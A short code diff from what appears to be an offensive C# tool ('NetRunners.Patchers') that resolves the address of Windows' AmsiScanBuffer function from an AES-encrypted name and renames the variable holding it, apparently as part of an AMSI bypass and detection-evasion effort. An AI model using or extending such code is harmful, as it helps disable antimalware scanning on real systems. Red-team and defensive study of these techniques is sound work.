@@ -40,7 +40,7 @@ namespace NetRunners.Patchers
                 if (Library == IntPtr.Zero)
                     throw new InvalidOperationException($"LoadLibraryA failed with error code: {Marshal.GetLastWin32Error()}");
                 // get amsiscanbuffer pointer
-                funcAddress = GetProcAddress(Library, DecryptBytesToStringAes(AmsiScanBuffer_Bytes, AesKey));
+                funcAddress = GetProcAddress(Library, DecryptBytesToStringAes(AmsiSb_Bytes, AesKey));
                 if (funcAddress == IntPtr.Zero)
                     throw new InvalidOperationException($"GetProcAddress failed with error code: {Marshal.GetLastWin32Error()}");
 
